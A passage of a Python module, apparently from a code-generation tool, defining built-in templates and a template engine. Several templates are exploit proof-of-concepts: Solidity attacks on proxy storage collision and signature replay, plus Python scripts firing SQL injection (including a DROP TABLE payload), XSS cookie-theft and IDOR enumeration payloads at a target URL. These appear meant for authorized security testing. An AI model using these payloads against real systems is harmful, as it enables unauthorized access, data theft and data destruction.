            "// SPDX-License-Identifier: MIT\n"
            "pragma solidity ^0.8.0;\n\n"
            "interface IProxy {\n"
            "    function implementation() external view returns (address);\n"
            "    function delegateTo(address impl) external;\n"
            "    function {{admin_function}}() external;\n"
            "}\n\n"
            "contract StorageCollisionPoC {\n"
            "    IProxy proxy;\n"
            "    constructor(address _proxy) { proxy = IProxy(_proxy); }\n"
            "    function attack() external {\n"
            "        address impl = proxy.implementation();\n"
            "        proxy.{{admin_function}}();\n"
            "    }\n"
            "}\n"
        ),
        tier_variants={
            "xianfeng": (
                "// SPDX-License-Identifier: MIT\n"
                "pragma solidity ^0.8.0;\n\n"
                "interface IProxy { function {{admin_function}}() external; }\n\n"
                "contract StorageCollisionPoC {\n"
                "    IProxy proxy;\n"
                "    constructor(address _p) { proxy = IProxy(_p); }\n"
                "    function attack() external { proxy.{{admin_function}}(); }\n"
                "}\n"
            ),
            "huben": (
                "// SPDX-License-Identifier: MIT\n"
                "pragma solidity ^0.8.0;\n\n"
                "import \"forge-std/Test.sol\";\n\n"
                "interface IProxy {\n"
                "    function implementation() external view returns (address);\n"
                "    function admin() external view returns (address);\n"
                "    function {{admin_function}}() external;\n"
                "}\n\n"
                "contract StorageCollisionPoC is Test {\n"
                "    IProxy proxy;\n"
                "    constructor(address _proxy) { proxy = IProxy(_proxy); }\n\n"
                "    /// @notice Storage collision in proxy pattern\n"
                "    /// @dev Proxy and implementation have different storage layouts\n"
                "    /// @impact Admin slot can be overwritten, allowing takeover\n"
                "    function attack() external {\n"
                "        address adminBefore = proxy.admin();\n"
                "        proxy.{{admin_function}}();\n"
                "        address adminAfter = proxy.admin();\n"
                "        assertNotEq(adminBefore, adminAfter, \"Admin unchanged — collision may not apply\");\n"
                "        emit log_named_address(\"Admin before\", adminBefore);\n"
                "        emit log_named_address(\"Admin after\", adminAfter);\n"
                "    }\n"
                "}\n"
            ),
        },
        variables=["admin_function"],
        dependencies=["forge-std/Test.sol"],
        signature="contract StorageCollisionPoC",
        tags=["poc", "storage-collision", "exploit", "web3", "security"],
    ),
    CodeTemplate(
        name="poc_signature_replay",
        description="Signature replay PoC — reuse valid signature across transactions",
        version=1,
        default=(
            "// SPDX-License-Identifier: MIT\n"
            "pragma solidity ^0.8.0;\n\n"
            "interface ITarget {\n"
            "    function {{verify_function}}(bytes32 hash, uint8 v, bytes32 r, bytes32 s) external;\n"
            "}\n\n"
            "contract SignatureReplayPoC {\n"
            "    ITarget target;\n"
            "    bytes32 lastHash;\n"
            "    uint8 lastV;\n"
            "    bytes32 lastR;\n"
            "    bytes32 lastS;\n\n"
            "    constructor(address _t) { target = ITarget(_t); }\n"
            "    function captureSignature(bytes32 h, uint8 v, bytes32 r, bytes32 s) external {\n"
            "        lastHash = h; lastV = v; lastR = r; lastS = s;\n"
            "    }\n"
            "    function replay() external {\n"
            "        target.{{verify_function}}(lastHash, lastV, lastR, lastS);\n"
            "    }\n"
            "}\n"
        ),
        tier_variants={
            "xianfeng": (
                "// SPDX-License-Identifier: MIT\n"
                "pragma solidity ^0.8.0;\n\n"
                "interface ITarget { function {{verify_function}}(bytes32, uint8, bytes32, bytes32) external; }\n\n"
                "contract SignatureReplayPoC {\n"
                "    ITarget target;\n"
                "    constructor(address _t) { target = ITarget(_t); }\n"
                "    function replay(bytes32 h, uint8 v, bytes32 r, bytes32 s) external {\n"
                "        target.{{verify_function}}(h, v, r, s);\n"
                "    }\n"
                "}\n"
            ),
            "huben": (
                "// SPDX-License-Identifier: MIT\n"
                "pragma solidity ^0.8.0;\n\n"
                "import \"forge-std/Test.sol\";\n\n"
                "interface ITarget {\n"
                "    function {{verify_function}}(bytes32 hash, uint8 v, bytes32 r, bytes32 s) external;\n"
                "    function nonceUsed(bytes32) external view returns (bool);\n"
                "}\n\n"
                "contract SignatureReplayPoC is Test {\n"
                "    ITarget target;\n"
                "    bytes32 capturedHash;\n"
                "    uint8 capturedV;\n"
                "    bytes32 capturedR;\n"
                "    bytes32 capturedS;\n\n"
                "    constructor(address _t) { target = ITarget(_t); }\n\n"
                "    /// @notice Signature replay on {{verify_function}}\n"
                "    /// @dev Target doesn't check nonce or chainId in signature\n"
                "    /// @impact Same signature can be replayed to execute action multiple times\n"
                "    function attack(bytes32 h, uint8 v, bytes32 r, bytes32 s) external {\n"
                "        capturedHash = h; capturedV = v; capturedR = r; capturedS = s;\n"
                "        // First use — should succeed\n"
                "        target.{{verify_function}}(h, v, r, s);\n"
                "        bool usedFirst = target.nonceUsed(h);\n"
                "        // Replay — if no nonce check, this succeeds again\n"
                "        target.{{verify_function}}(h, v, r, s);\n"
                "        bool usedSecond = target.nonceUsed(h);\n"
                "        assertTrue(usedFirst, \"First execution failed\");\n"
                "        emit log_string(\"Signature replayed — nonce not checked\");\n"
                "    }\n"
                "}\n"
            ),
        },
        variables=["verify_function"],
        dependencies=["forge-std/Test.sol"],
        signature="contract SignatureReplayPoC",
        tags=["poc", "signature-replay", "exploit", "web3", "security"],
    ),
    CodeTemplate(
        name="poc_sqli",
        description="SQL injection PoC — demonstrate data exfiltration via injection",
        version=1,
        default=(
            "import requests\n\n"
            "TARGET_URL = \"{{target_url}}\"\n"
            "INJECT_PARAM = \"{{param_name}}\"\n\n"
            "payloads = [\n"
            "    \"' OR '1'='1\",\n"
            "    \"' UNION SELECT NULL,NULL,NULL--\",\n"
            "    \"'; DROP TABLE users;--\",\n"
            "    \"' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a\",\n"
            "]\n\n"
            "for payload in payloads:\n"
            "    r = requests.get(TARGET_URL, params={INJECT_PARAM: payload})\n"
            "    print(f\"Payload: {payload}\")\n"
            "    print(f\"Status: {r.status_code}, Length: {len(r.text)}\")\n"
            "    if \"error\" in r.text.lower() or \"sql\" in r.text.lower():\n"
            "        print(\"[!] SQL error detected — injection confirmed\")\n"
            "    print()\n"
        ),
        tier_variants={
            "xianfeng": (
                "import requests\n"
                "r = requests.get(\"{{target_url}}\", params={\"{{param_name}}\": \"' OR '1'='1\"})\n"
                "print(r.status_code, len(r.text))\n"
            ),
            "huben": (
                "import requests\n"
                "import sys\n\n"
                "TARGET_URL = \"{{target_url}}\"\n"
                "PARAM = \"{{param_name}}\"\n\n"
                "def test_injection(payload, description):\n"
                "    r = requests.get(TARGET_URL, params={PARAM: payload}, timeout=10)\n"
                "    indicators = [\"error\", \"sql\", \"exception\", \"syntax\", \"mysql\", \"postgres\", \"sqlite\"]\n"
                "    is_vulnerable = any(ind in r.text.lower() for ind in indicators)\n"
                "    print(f\"[{description}]\")\n"
                "    print(f\"  Payload: {payload}\")\n"
                "    print(f\"  Status: {r.status_code}, Length: {len(r.text)}\")\n"
                "    print(f\"  Vulnerable: {is_vulnerable}\")\n"
                "    return is_vulnerable\n\n"
                "results = []\n"
                "results.append(test_injection(\"' OR '1'='1\", \"Auth bypass\"))\n"
                "results.append(test_injection(\"' UNION SELECT NULL--\", \"Column count\"))\n"
                "results.append(test_injection(\"' AND SLEEP(5)--\", \"Time-based\"))\n"
                "results.append(test_injection(\"1' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a\", \"Blind\"))\n\n"
                "if any(results):\n"
                "    print(\"\\n[!] SQL injection confirmed — PoC successful\")\n"
                "    sys.exit(0)\n"
                "else:\n"
                "    print(\"\\n[-] No injection found\")\n"
                "    sys.exit(1)\n"
            ),
        },
        variables=["target_url", "param_name"],
        dependencies=["requests"],
        signature="def test_injection",
        tags=["poc", "sqli", "exploit", "web", "security"],
    ),
    CodeTemplate(
        name="poc_xss",
        description="XSS PoC — demonstrate script execution via user input",
        version=1,
        default=(
            "import requests\n\n"
            "TARGET_URL = \"{{target_url}}\"\n"
            "PARAM = \"{{param_name}}\"\n\n"
            "payloads = [\n"
            "    \"<script>alert(1)</script>\",\n"
            "    \"<img src=x onerror=alert(1)>\",\n"
            "    \"<svg onload=alert(1)>\",\n"
            "    \"javascript:alert(1)\",\n"
            "    \"\\\"><script>alert(document.cookie)</script>\",\n"
            "]\n\n"
            "for payload in payloads:\n"
                "    r = requests.get(TARGET_URL, params={PARAM: payload})\n"
                "    if payload in r.text:\n"
                "        print(f\"[!] Reflected: {payload}\")\n"
                "    if \"<script>\" in r.text or \"onerror\" in r.text:\n"
                "        print(\"[!] XSS confirmed — payload reflected unescaped\")\n"
        ),
        tier_variants={
            "xianfeng": (
                "import requests\n"
                "r = requests.get(\"{{target_url}}\", params={\"{{param_name}}\": \"<script>alert(1)</script>\"})\n"
                "print(\"XSS\" if \"<script>\" in r.text else \"Safe\")\n"
            ),
            "huben": (
                "import requests\n"
                "import sys\n\n"
                "TARGET_URL = \"{{target_url}}\"\n"
                "PARAM = \"{{param_name}}\"\n\n"
                "payloads = [\n"
                "    (\"<script>alert(1)</script>\", \"Basic script tag\"),\n"
                "    (\"<img src=x onerror=alert(1)>\", \"Img onerror\"),\n"
                "    (\"<svg onload=alert(1)>\", \"SVG onload\"),\n"
                "    (\"\\\"><script>alert(document.cookie)</script>\", \"Context break\"),\n"
                "    (\"<iframe src=javascript:alert(1)>\", \"Iframe\"),\n"
                "    (\"{{constructor.constructor('alert(1)')()}}\", \"Angular template\"),\n"
                "]\n\n"
                "found = False\n"
                "for payload, desc in payloads:\n"
                "    r = requests.get(TARGET_URL, params={PARAM: payload}, timeout=10)\n"
                "    reflected = payload in r.text\n"
                "    unescaped = any(x in r.text for x in [\"<script>\", \"onerror=\", \"onload=\"])\n"
                "    if reflected and unescaped:\n"
                "        print(f\"[!] XSS CONFIRMED: {desc}\")\n"
                "        print(f\"    Payload: {payload}\")\n"
                "        found = True\n"
                "    else:\n"
                "        print(f\"[-] {desc}: {'Reflected but escaped' if reflected else 'Not reflected'}\")\n\n"
                "if found:\n"
                "    print(\"\\n[!] XSS vulnerability confirmed — PoC successful\")\n"
                "    sys.exit(0)\n"
                "print(\"\\n[-] No XSS found\")\n"
                "sys.exit(1)\n"
            ),
        },
        variables=["target_url", "param_name"],
        dependencies=["requests"],
        signature="def test_xss",
        tags=["poc", "xss", "exploit", "web", "security"],
    ),
    CodeTemplate(
        name="poc_idor",
        description="IDOR PoC — demonstrate unauthorized object access",
        version=1,
        default=(
            "import requests\n\n"
            "BASE_URL = \"{{base_url}}\"\n"
            "RESOURCE = \"{{resource_path}}\"\n\n"
            "for resource_id in range(1, 20):\n"
            "    url = f\"{BASE_URL}/{RESOURCE}/{resource_id}\"\n"
            "    r = requests.get(url)\n"
            "    if r.status_code == 200:\n"
            "        print(f\"[+] Accessible: {url}\")\n"
            "        if \"email\" in r.text.lower() or \"phone\" in r.text.lower():\n"
            "            print(f\"    [!] Sensitive data exposed: {r.text[:200]}\")\n"
            "    elif r.status_code == 403:\n"
            "        print(f\"[-] Forbidden: {url}\")\n"
        ),
        tier_variants={
            "xianfeng": (
                "import requests\n"
                "r = requests.get(\"{{base_url}}/{{resource_path}}/1\")\n"
                "print(r.status_code, r.text[:100])\n"
            ),
            "huben": (
                "import requests\n"
                "import sys\n\n"
                "BASE_URL = \"{{base_url}}\"\n"
                "RESOURCE = \"{{resource_path}}\"\n"
                "SESSION_COOKIE = None  # Set if auth required\n\n"
                "cookies = {\"session\": SESSION_COOKIE} if SESSION_COOKIE else {}\n"
                "accessible = []\n"
                "sensitive = []\n\n"
                "for rid in range(1, 50):\n"
                "    url = f\"{BASE_URL}/{RESOURCE}/{rid}\"\n"
                "    r = requests.get(url, cookies=cookies, timeout=10)\n"
                "    if r.status_code == 200:\n"
                "        accessible.append(rid)\n"
                "        data = r.json() if r.headers.get(\"content-type\", \"\").startswith(\"application/json\") else r.text\n"
                "        sensitive_fields = [\"email\", \"phone\", \"ssn\", \"password\", \"address\", \"credit\"]\n"
                "        if isinstance(data, dict):\n"
                "            exposed = [f for f in sensitive_fields if f in str(data).lower()]\n"
                "            if exposed:\n"
                "                sensitive.append((rid, exposed))\n"
                "                print(f\"[!] IDOR CONFIRMED: {url} — exposed: {exposed}\")\n"
                "    elif r.status_code == 403:\n"
                "        pass  # Properly protected\n\n"
                "if sensitive:\n"
                "    print(f\"\\n[!] IDOR confirmed — {len(sensitive)} resources with sensitive data\")\n"
                "    sys.exit(0)\n"
                "elif len(accessible) > 5:\n"
                "    print(f\"\\n[?] {len(accessible)} resources accessible without auth — potential IDOR\")\n"
                "    sys.exit(0)\n"
                "else:\n"
                "    print(\"\\n[-] No IDOR found\")\n"
                "    sys.exit(1)\n"
            ),
        },
        variables=["base_url", "resource_path"],
        dependencies=["requests"],
        signature="def test_idor",
        tags=["poc", "idor", "exploit", "web", "security"],
    ),
    CodeTemplate(
        name="pydantic_settings",
        description="Pydantic Settings with env var support",
        version=1,
        default=(
            "class Settings(BaseSettings):\n"
            "    app_name: str = '{{app_name}}'\n"
            "    debug: bool = False\n"
        ),
        tier_variants={
            "xianfeng": (
                "class Settings(BaseSettings):\n    app_name: str = '{{app_name}}'\n"
            ),
            "wei_wuzu": (
                "class Settings(BaseSettings):\n"
                "    model_config = SettingsConfigDict(env_file='.env')\n\n"
                "    app_name: str = '{{app_name}}'\n"
                "    debug: bool = False\n"
                "    database_url: str = 'sqlite:///app.db'\n"
            ),
            "huben": (
                "class Settings(BaseSettings):\n"
                "    model_config = SettingsConfigDict(\n"
                "        env_file='.env',\n"
                "        env_file_encoding='utf-8',\n"
                "        case_sensitive=False,\n"
                "    )\n\n"
                "    app_name: str = '{{app_name}}'\n"
                "    debug: bool = False\n"
                "    database_url: SecretStr = SecretStr('sqlite:///app.db')\n"
                "    log_level: str = 'INFO'\n\n"
                "    @field_validator('log_level')\n"
                "    @classmethod\n"
                "    def check_log_level(cls, v: str) -> str:\n"
                "        if v not in ('DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL'):\n"
                "            raise ValueError('Invalid log level')\n"
                "        return v\n"
            ),
        },
        variables=["app_name"],
        dependencies=["pydantic-settings"],
        signature="BaseSettings subclass",
        tags=["pydantic", "settings", "config"],
    ),
    # Phase 6: Polyglot templates
    CodeTemplate(
        name="rust_struct",
        description="Rust struct with derives",
        version=1,
        default=(
            "#[derive(Debug, Clone)]\n"
            "pub struct {{name}} {\n"
            "    pub id: u64,\n"
            "}\n"
        ),
        tier_variants={
            "xianfeng": (
                "#[derive(Debug)]\n"
                "pub struct {{name}} {\n"
                "    pub id: u64,\n"
                "}\n"
            ),
            "wei_wuzu": (
                "#[derive(Debug, Clone)]\n"
                "pub struct {{name}} {\n"
                "    pub id: u64,\n"
                "    pub label: String,\n"
                "}\n"
            ),
            "huben": (
                "#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]\n"
                "pub struct {{name}} {\n"
                "    pub id: u64,\n"
                "    pub label: String,\n"
                "    pub created_at: chrono::DateTime<chrono::Utc>,\n"
                "}\n\n"
                "impl {{name}} {\n"
                "    pub fn new(id: u64, label: String) -> Self {\n"
                "        Self { id, label, created_at: chrono::Utc::now() }\n"
                "    }\n"
                "}\n"
            ),
        },
        variables=["name"],
        dependencies=["serde", "chrono"],
        signature="pub struct",
        tags=["rust", "struct", "polyglot"],
    ),
    CodeTemplate(
        name="rust_trait_impl",
        description="Rust trait implementation scaffold",
        version=1,
        default=(
            "impl {{trait_name}} for {{type_name}} {\n"
            "    fn {{method_name}}(&self) -> {{return_type}} {\n"
            "        todo!()\n"
            "    }\n"
            "}\n"
        ),
        tier_variants={
            "xianfeng": (
                "impl {{trait_name}} for {{type_name}} {\n"
                "    fn {{method_name}}(&self) -> {{return_type}} {\n"
                "        todo!()\n"
                "    }\n"
                "}\n"
            ),
            "wei_wuzu": (
                "impl {{trait_name}} for {{type_name}} {\n"
                "    fn {{method_name}}(&self) -> {{return_type}} {\n"
                "        unimplemented!(\"{{method_name}} not yet implemented\")\n"
                "    }\n"
                "}\n"
            ),
            "huben": (
                "impl {{trait_name}} for {{type_name}} {\n"
                "    fn {{method_name}}(&self) -> {{return_type}} {\n"
                "        // TODO: implement {{method_name}} for {{type_name}}\n"
                "        unimplemented!(\"{{method_name}} not yet implemented for {{type_name}}\")\n"
                "    }\n"
                "}\n"
            ),
        },
        variables=["trait_name", "type_name", "method_name", "return_type"],
        dependencies=[],
        signature="impl trait",
        tags=["rust", "trait", "polyglot"],
    ),
    CodeTemplate(
        name="go_handler",
        description="Go HTTP handler function",
        version=1,
        default=(
            "func {{name}}Handler(w http.ResponseWriter, r *http.Request) {\n"
            "    w.WriteHeader(http.StatusOK)\n"
            '    w.Write([]byte("ok"))\n'
            "}\n"
        ),
        tier_variants={
            "xianfeng": (
                "func {{name}}Handler(w http.ResponseWriter, r *http.Request) {\n"
                "    w.WriteHeader(http.StatusOK)\n"
                '    w.Write([]byte("ok"))\n'
                "}\n"
            ),
            "wei_wuzu": (
                "func {{name}}Handler(w http.ResponseWriter, r *http.Request) {\n"
                "    if r.Method != http.MethodGet {\n"
                "        http.Error(w, \"Method not allowed\", http.StatusMethodNotAllowed)\n"
                "        return\n"
                "    }\n"
                "    w.Header().Set(\"Content-Type\", \"application/json\")\n"
                "    w.WriteHeader(http.StatusOK)\n"
                '    json.NewEncoder(w).Encode(map[string]bool{"ok": true})\n'
                "}\n"
            ),
            "huben": (
                "func {{name}}Handler(w http.ResponseWriter, r *http.Request) {\n"
                "    if r.Method != http.MethodGet {\n"
                "        http.Error(w, \"Method not allowed\", http.StatusMethodNotAllowed)\n"
                "        return\n"
                "    }\n\n"
                "    ctx := r.Context()\n"
                "    result, err := service.Get{{name}}(ctx)\n"
                "    if err != nil {\n"
                "        log.Printf(\"{{name}}Handler error: %%v\", err)\n"
                "        http.Error(w, \"Internal server error\", http.StatusInternalServerError)\n"
                "        return\n"
                "    }\n\n"
                "    w.Header().Set(\"Content-Type\", \"application/json\")\n"
                "    w.WriteHeader(http.StatusOK)\n"
                "    json.NewEncoder(w).Encode(result)\n"
                "}\n"
            ),
        },
        variables=["name"],
        dependencies=["net/http", "encoding/json"],
        signature="func Handler",
        tags=["go", "handler", "http", "polyglot"],
    ),
    CodeTemplate(
        name="typescript_interface",
        description="TypeScript interface definition",
        version=1,
        default=(
            "interface {{name}} {\n"
            "  id: number;\n"
            "}\n"
        ),
        tier_variants={
            "xianfeng": (
                "interface {{name}} {\n"
                "  id: number;\n"
                "}\n"
            ),
            "wei_wuzu": (
                "interface {{name}} {\n"
                "  id: number;\n"
                "  label: string;\n"
                "}\n"
            ),
            "huben": (
                "interface {{name}} {\n"
                "  id: number;\n"
                "  label: string;\n"
                "  createdAt: Date;\n"
                "  updatedAt?: Date;\n"
                "}\n\n"
                "export type {{name}}Input = Omit<{{name}}, 'id' | 'createdAt'>;\n"
                "export type {{name}}Update = Partial<{{name}}Input>;\n"
            ),
        },
        variables=["name"],
        dependencies=[],
        signature="interface",
        tags=["typescript", "interface", "type", "polyglot"],
    ),
    CodeTemplate(
        name="typescript_react_component",
        description="React function component",
        version=1,
        default=(
            "export function {{name}}() {\n"
            "  return <div>{{name}}</div>;\n"
            "}\n"
        ),
        tier_variants={
            "xianfeng": (
                "export function {{name}}() {\n"
                "  return <div>{{name}}</div>;\n"
                "}\n"
            ),
            "wei_wuzu": (
                "interface {{name}}Props {\n"
                "  title?: string;\n"
                "}\n\n"
                "export function {{name}}({ title }: {{name}}Props) {\n"
                '  return <div>{title || "{{name}}"}</div>;\n'
                "}\n"
            ),
            "huben": (
                "import { useState, useEffect } from 'react';\n\n"
                "interface {{name}}Props {\n"
                "  title?: string;\n"
                "  onLoad?: () => void;\n"
                "}\n\n"
                "export function {{name}}({ title, onLoad }: {{name}}Props) {\n"
                "  const [data, setData] = useState<unknown>(null);\n\n"
                "  useEffect(() => {\n"
                "    onLoad?.();\n"
                "  }, [onLoad]);\n\n"
                '  return <div>{title || "{{name}}"}{data && <pre>{JSON.stringify(data)}</pre>}</div>;\n'
                "}\n"
            ),
        },
        variables=["name"],
        dependencies=["react"],
        signature="React.FC",
        tags=["typescript", "react", "component", "polyglot"],
    ),
    # Phase 2: Project template
    CodeTemplate(
        name="fastapi_crud_project",
        description="Full FastAPI CRUD project scaffold with model, endpoint, Dockerfile, and CI",
        version=1,
        default="",
        tier_variants={},
        variables=["name", "path"],
        dependencies=["fastapi", "pydantic", "sqlalchemy", "docker", "github-actions"],
        signature="multi-file project",
        tags=["fastapi", "project", "scaffold"],
        files=[
            {
                "path": "src/main.py",
                "template": "fastapi_endpoint",
                "variables": {"path": "/items", "name": "items"},
            },
            {
                "path": "src/models.py",
                "template": "pydantic_model",
                "variables": {"name": "Item"},
            },
            {
                "path": "Dockerfile",
                "template": "dockerfile",
            },
            {
                "path": ".github/workflows/ci.yml",
                "template": "github_action",
            },
        ],
    ),
]


class CodeGenomeEngine:
    """Manages code templates from built-in defaults and YAML files.

    Templates in $WM_STATE_ROOT/codegenome/ override built-ins by name.
    """

    def __init__(self, codegenome_dir: str | None = None) -> None:
        self._templates: dict[str, CodeTemplate] = {}
        self._lock = threading.RLock()

        for t in _BUILTIN_TEMPLATES:
            self._templates[t.name] = t

        from whitemagic.config.paths import WM_ROOT

        self._codegenome_dir = codegenome_dir or str(WM_ROOT / "codegenome")
        self._load_from_disk()

    def _load_from_disk(self) -> None:
        """Load YAML templates from the codegenome directory."""
        if not HAS_YAML:
            return

        cg_path = Path(self._codegenome_dir)
        if not cg_path.is_dir():
            return

        for yaml_file in sorted(
            list(cg_path.glob("*.yaml")) + list(cg_path.glob("*.yml"))
        ):
            try:
                with open(yaml_file) as f:
                    data = yaml.safe_load(f)
                if not isinstance(data, dict) or "name" not in data:
                    continue

                template = CodeTemplate(
                    name=data["name"],
                    description=data.get("description", ""),
                    version=data.get("version", 1),
                    default=data.get("default", ""),
                    tier_variants=data.get("tier_variants", {}),
                    variables=data.get("variables", []),
                    dependencies=data.get("dependencies", []),
                    signature=data.get("signature", ""),
                    tags=data.get("tags", []),
                    parent_id=data.get("parent_id", ""),
                    success_rate=data.get("success_rate", 1.0),
                    last_used=data.get("last_used", ""),
                    source=str(yaml_file),
                    deprecated=data.get("deprecated", False),
                    content_hash=data.get("content_hash", ""),
                    signature_key=data.get("signature_key", ""),
                    files=data.get("files", []),
                )
                self._templates[template.name] = template
                logger.debug(
                    "Loaded code template: %s from %s", template.name, yaml_file
                )
            except Exception as e:
                logger.warning("Failed to load code template %s: %s", yaml_file, e)

    def render(self, template_name: str, tier: str | None = None, **kwargs: Any) -> str:
        """Render a named template with variables."""
        template = self._templates.get(template_name)
        if template is None:
            return f"[unknown template: {template_name}]"

        # Phase 5: Strict signing mode
        import os
        if os.environ.get("WM_CODEGENOME_STRICT_SIGNING") and template.signature_key == "":
            if template.source not in ("builtin",):
                return f"[unsigned template refused in strict mode: {template_name}]"

        return template.render(tier=tier, **kwargs)

    def render_project(
        self, template_name: str, tier: str | None = None, **kwargs: Any
    ) -> dict[str, str]:
        """Render a project template into multiple files (Phase 2).

        Args:
            template_name: Name of a project template (has `files` key)
            tier: Tier variant for all sub-templates
            **kwargs: Variables shared across all files

        Returns:
            Dict mapping file paths to rendered code strings
        """
        template = self._templates.get(template_name)
        if template is None:
            return {"error": f"[unknown template: {template_name}]"}

        if not template.files:
            # Not a project template — render as single file
            return {
                "main": template.render(tier=tier, **kwargs)
            }

        result: dict[str, str] = {}
        for file_spec in template.files:
            file_path = file_spec.get("path", "output.txt")
            sub_template_name = file_spec.get("template", "")
            sub_vars = {**kwargs, **file_spec.get("variables", {})}

            if sub_template_name:
                sub_template = self._templates.get(sub_template_name)
                if sub_template:
                    result[file_path] = sub_template.render(tier=tier, **sub_vars)
                else:
                    result[file_path] = f"[unknown sub-template: {sub_template_name}]"
            elif "content" in file_spec:
                result[file_path] = file_spec["content"]
            else:
                result[file_path] = template.render(tier=tier, **sub_vars)

        return result

    def list_templates(self, tag: str | None = None) -> list[dict[str, Any]]:
        """List all available templates, optionally filtered by tag."""
        results = []
        for t in self._templates.values():
            if tag and tag not in t.tags:
                continue
            results.append(t.to_dict())
        return sorted(results, key=lambda x: x["name"])

    def get_template(self, name: str) -> CodeTemplate | None:
        """Get a template by name."""
        return self._templates.get(name)

    def register(self, template: CodeTemplate) -> None:
        """Register a template at runtime."""
        with self._lock:
            self._templates[template.name] = template

    def fork_template(
        self, name: str, new_name: str, body_delta: str = ""
    ) -> CodeTemplate | None:
        """Fork an existing template into a new one."""
        parent = self._templates.get(name)
        if parent is None:
            return None
        child = parent.fork(new_name, body_delta)
        with self._lock:
            self._templates[child.name] = child
        return child

    def reload(self) -> None:
        """Reload templates from disk (preserves built-ins)."""
        with self._lock:
            for t in _BUILTIN_TEMPLATES:
                self._templates[t.name] = t
            self._load_from_disk()

    def status(self) -> dict[str, Any]:
        """Get engine status."""
        return {
            "total_templates": len(self._templates),
            "builtin_count": sum(
                1 for t in self._templates.values() if t.source == "builtin"
            ),
            "disk_count": sum(
                1
                for t in self._templates.values()
                if t.source not in ("builtin", "forked")
            ),
            "forked_count": sum(
                1 for t in self._templates.values() if t.source == "forked"
            ),
            "codegenome_dir": self._codegenome_dir,
            "yaml_available": HAS_YAML,
        }


_engine: CodeGenomeEngine | None = None
_engine_lock = threading.RLock()


def get_codegenome_engine() -> CodeGenomeEngine:
    """Get the global CodeGenomeEngine instance."""
    global _engine
    if _engine is None:
        with _engine_lock:
            if _engine is None:
                _engine = CodeGenomeEngine()
    return _engine
